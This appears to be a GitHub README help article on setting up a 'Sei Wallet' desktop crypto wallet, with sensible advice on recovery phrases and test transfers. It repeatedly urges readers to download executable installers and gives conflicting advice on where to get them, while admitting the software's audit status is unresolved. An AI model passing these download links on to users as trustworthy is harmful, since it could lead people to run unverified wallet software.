![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">How to create a Sei wallet and what the setup asks for</h1>

<p align="center">Set up an account, write the phrase down, and fund it only after that.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Creating a wallet is a five-minute job with one irreversible step in the middle: the moment the app shows you a recovery phrase, that phrase becomes the only thing standing between you and a permanent loss. Everything else in the setup — a password, a name for the account, a confirmation screen — is recoverable or cosmetic.

This guide covers what the flow asks for, in order, and the three places people get it wrong. If you already have a wallet and want to bring it across instead, that is a different job and [restoring instead of creating](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md) is the article you want.

## Before you start: get the file from the right place

Nothing else in this process matters if the installer is not the real one. A convincing lookalike produces a wallet that works perfectly while sending your keys somewhere else, and no later step will reveal it.

So start here: use the address you already trust, type it rather than clicking a link from a message, and check the publisher your operating system reports when you first run the installer. That check is the first gate, and it cannot be undone later.

## What the setup asks for

The order varies slightly between versions, but the sequence is consistent.

**1. A password, or none at all.** Some setups offer a local password that encrypts the key material on disk; others rely on your operating-system account. If you set one, it protects the file at rest and it is **not** a recovery mechanism — forget it and you may need to restore from the phrase. If you decline one, your machine's login becomes the only barrier.

**2. A new recovery phrase, generated locally.** Twelve or twenty-four words, generated on your device. Nothing is transmitted, and the app should never ask you to type them anywhere except the confirmation step that follows.

**3. A confirmation.** The app asks you to re-enter some of the words, or to select them in order, to prove you wrote them down. This step is annoying and it is the most valuable part of the setup: it catches the person who screenshotted the phrase, closed the window, and later discovered the screenshot was of the wrong screen.

**4. A name for the account.** Cosmetic. It changes what you see in the selector, not what the address is.

That is the whole flow. There is no email, no identity check, no account to verify — which is the point of self-custody and also why no support desk can restore anything for you.

## The recovery phrase, handled properly

This is the step worth slowing down for.

- **Write it by hand, on paper or metal.** Not a photo, not a note in a password manager, not a draft email, not a chat message to yourself. A cloud-synced image is one compromised account away from being public.
- **Write it in the order given**, and number the words if the app does not. Order is part of the secret.
- **Check it once by restoring.** After setup, restore the phrase into a fresh account or a second wallet and confirm you get the same address back. Five minutes now versus discovering a transcription error at the worst possible moment.
- **Store it away from the device.** A theft that takes both is a total loss.
- **Never type it into a website, a "validation" page, or a support chat.** Setup and restore are the only two places the words belong, and both happen locally. The scam patterns are consistent — if any page asks for the words after setup, the page is the attack, whatever it calls itself.

One clarification that prevents a common panic: the phrase is not a password for the app. It is the account. Reinstalling the app does nothing to it, and uninstalling the app does nothing to your funds.

## The first thing to do after setup

Before you send anything meaningful, do this:

1. Open the receive view and copy the address.
2. Send a small test amount from wherever the SEI sits today.
3. Confirm it arrives, and confirm it is spendable — not just displayed.
4. Then move the rest.

If the funds are coming from an exchange, the withdrawal has its own rules about networks and memos, and those rules decide whether the transfer arrives at all. If they are coming from another wallet, the transfer is simpler but the address-form question is the same.

## Three ways this goes wrong

**The phrased screenshot.** The most common self-inflicted loss. A screenshot in a photo library syncs to a cloud account, and cloud accounts get compromised. If you have already done it, treat the phrase as exposed and create a new wallet.

**The skipped confirmation.** People click through the "verify your phrase" step because they are sure they wrote it correctly. That step exists because confidence is not accuracy.

**The impatient first transfer.** Sending the full balance before testing the address works, then discovering the address belonged to a different account. Test transfers are cheap; corrections are not.

## Creating versus importing

A new wallet generates a new phrase, which means a new set of accounts. Importing brings an existing phrase in, which reproduces the accounts that phrase already controls.

They are not interchangeable, and the difference matters if you are moving from another wallet: importing reproduces your old address, creating gives you a new one that you then have to fund. Which is right depends on whether you want a fresh start or continuity.

## If you would rather not use a desktop app

Three other shapes exist, and they differ mainly in where the keys live and how the app is delivered:

- **A browser extension** keeps everything in the browser and connects to web applications most directly. The trade-offs are in [desktop versus extension](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md).
- **A multi-chain Cosmos wallet** like Keplr is a reasonable choice if you hold several Cosmos chains and want one interface, compared in [Keplr as an alternative](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md).
- **A hosted or in-app wallet** is a different trust model altogether: the key handling is not in your hands in the same way, and it is a separate product category from a self-custody desktop app.

What the wallet is for, and who runs it, is covered in [what the wallet is for](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md). If you are weighing whether a self-custody desktop app is the right starting point at all, [the safety position](https://github.com/sei-chain/sei-wallet-help/blob/main/is-it-safe-to-use.md) sets out what is and is not verified about the software — including the audit status, which is unresolved.

## Frequently asked questions

**How do I create a Sei wallet?** Install the app from the operator's own domain, run the setup, write the recovery phrase down offline, confirm it, then fund the account with a small test amount first.

**Do I need an email or account?** No. There is no sign-up, and no identity is attached to the wallet.

**What if I forget the app password?** If the setup used a local password, you may need to restore from the recovery phrase. The password is not recoverable and it is not the phrase.

**Can I have more than one account?** Yes. Adding accounts creates new addresses from the same phrase, which is why one wallet can show several addresses.

**Where is my wallet stored?** Keys are generated and encrypted on your device; the funds are on-chain. Uninstalling the app does not touch the funds, and losing the phrase does.

**Is creating a wallet free?** Yes. You pay network fees when you transact, not to create an account.

**Should I use a hardware wallet from the start?** If the balance will be significant, it is easier to set up that way than to migrate later. Which devices are supported is a separate question, and not all of them are documented.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Importing an existing wallet into Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/import-an-existing-recovery-phrase.md)
- [A desktop Sei Wallet or a browser extension: which to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/desktop-app-or-browser-extension.md)
- [Sei Wallet and Keplr: two ways to hold SEI](https://github.com/sei-chain/sei-wallet-help/blob/main/keplr-compared-with-a-desktop-app.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
